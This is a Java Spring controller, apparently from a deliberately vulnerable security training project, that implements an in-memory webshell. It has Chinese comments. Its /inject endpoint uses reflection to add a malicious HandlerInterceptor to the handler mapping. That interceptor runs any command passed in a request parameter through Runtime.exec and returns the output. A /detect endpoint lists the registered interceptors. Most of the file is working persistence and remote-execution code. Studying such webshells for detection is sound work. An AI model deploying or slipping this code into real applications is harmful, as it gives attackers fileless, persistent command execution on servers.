package top.whgojp.modules.mshell.controller;

import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;
import io.swagger.annotations.ApiParam;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.handler.MappedInterceptor;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import top.whgojp.common.utils.R;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.List;

/**
 * Spring拦截器型内存马
 * 通过动态注册HandlerInterceptor实现命令执行
 * 
 * @author whgojp
 * @date 2024/03/20
 */
@Slf4j
@Api(tags = "Spring拦截器型内存马")
@Controller
@RequestMapping("/mshell/interceptor")
public class InterceptorMemShellController extends BaseMemShellController {

    @Autowired
    private RequestMappingHandlerMapping handlerMapping;

    @RequestMapping("")
    public String index() {
        return "vul/mshell/interceptor";
    }

    @ApiOperation("注入Spring拦截器型内存马")
    @PostMapping("/inject")
    @ResponseBody
    public R inject(
            @ApiParam("拦截路径") @RequestParam(defaultValue = "/**") String pattern,
            @ApiParam("命令参数名") @RequestParam(defaultValue = "cmd") String cmdParam) {
        try {
            // 创建恶意拦截器
            HandlerInterceptor evilInterceptor = new HandlerInterceptor() {
                @Override
                public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) 
                        throws Exception {
                    String cmd = request.getParameter(cmdParam);
                    if (cmd != null) {
                        try {
                            Process process = Runtime.getRuntime().exec(cmd);
                            InputStream in = process.getInputStream();
                            byte[] b = new byte[1024];
                            int n;
                            while ((n = in.read(b)) != -1) {
                                response.getOutputStream().write(b, 0, n);
                            }
                            response.getOutputStream().flush();
                            return false;
                        } catch (IOException e) {
                            log.error("命令执行失败", e);
                            response.getWriter().println("Error: " + e.getMessage());
                            return false;
                        }
                    }
                    return true;
                }
            };

            // 通过反射获取adaptedInterceptors字段
            Field adaptedInterceptors = RequestMappingHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            adaptedInterceptors.setAccessible(true);
            @SuppressWarnings("unchecked")
            List<Object> interceptors = (List<Object>) adaptedInterceptors.get(handlerMapping);

            // 创建MappedInterceptor并添加到列表中
            MappedInterceptor mappedInterceptor = new MappedInterceptor(new String[]{pattern}, evilInterceptor);
            interceptors.add(mappedInterceptor);

            log.info("Spring拦截器型内存马注入成功，拦截路径: {}, 命令参数: {}", pattern, cmdParam);
            return R.ok("内存马注入成功").put("data", "拦截路径: " + pattern + ", 命令参数: " + cmdParam);
        } catch (Exception e) {
            log.error("注入失败", e);
            return R.error("注入失败：" + e.getMessage());
        }
    }

    @ApiOperation("检测Spring拦截器型内存马")
    @GetMapping("/detect")
    @ResponseBody
    public R detect() {
        try {
            StringBuilder result = new StringBuilder();
            result.append("已注入的拦截器列表：\n");
            
            // 通过反射获取adaptedInterceptors字段
            Field adaptedInterceptors = RequestMappingHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            adaptedInterceptors.setAccessible(true);
            @SuppressWarnings("unchecked")
            List<Object> interceptors = (List<Object>) adaptedInterceptors.get(handlerMapping);

            // 获取所有拦截器信息
            for (Object interceptor : interceptors) {
                if (interceptor instanceof MappedInterceptor) {
                    MappedInterceptor mappedInterceptor = (MappedInterceptor) interceptor;
                    result.append("- MappedInterceptor: ")
                          .append(mappedInterceptor.getClass().getName())
                          .append("\n  路径模式: ")
                          .append(String.join(", ", mappedInterceptor.getPathPatterns()))
                          .append("\n  拦截器类型: ")
                          .append(mappedInterceptor.getInterceptor().getClass().getName())
                          .append("\n");
                } else {
                    result.append("- ")
                          .append(interceptor.getClass().getName())
                          .append("\n");
                }
            }

            return R.ok().put("data", result.toString());
        } catch (Exception e) {
            log.error("检测失败", e);
            return R.error("检测失败：" + e.getMessage());
        }
    }
}
